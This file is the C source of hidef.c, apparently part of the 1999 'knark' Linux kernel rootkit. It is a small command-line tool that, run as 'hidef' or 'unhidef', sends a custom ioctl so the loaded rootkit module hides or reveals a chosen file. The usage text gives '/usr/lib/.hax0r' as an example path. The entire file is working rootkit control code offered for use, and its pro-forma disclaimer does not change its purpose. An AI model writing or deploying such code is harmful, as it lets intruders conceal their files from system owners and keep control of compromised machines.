/*
 * hidef.c, part of the knark package
 * (c) Creed @ #hack.se 1999 <creed@sekure.net>
 * 
 * This program may NOT be used in an illegal way,
 * or to cause damage of any kind.
 * 
 * See README for more info.
 */

#include <sys/types.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>

#include "knark.h"


void usage(const char *progname)
{
    fprintf(stderr,
	    "Usage:\n"
	    "\t%s /usr/lib/.hax0r\n",
	    progname);
    exit(-1);
}


int main(int argc, char *argv[])
{
    int fd, len, hidef=0;
    char *avp;
    
    author_banner("hidef.c");
    
    len = strlen(argv[0]);
    for(avp = argv[0]+len-1; avp > argv[0] && *avp != '/'; avp--);
    if(*avp == '/')
	avp++;
    
    if(!strcmp("hidef", avp))
	hidef++;
    else if(strcmp("unhidef", avp))
    {
	fprintf(stderr, "argv[0] is neither \"hidef\" nor \"unhidef\"\n");
	exit(-1);
    }
    
    if(argc != 2)
	usage(argv[0]);
    
    if( (fd = open(argv[1], O_RDONLY)) == -1)
	perror("open"), exit(-1);
    
    if( (ioctl(fd, KNARK_ELITE_CMD, hidef?KNARK_HIDE_FILE:KNARK_UNHIDE_FILE)) == -1)
	perror("ioctl"), exit(-1);

    close(fd);
    
    exit(0);
}
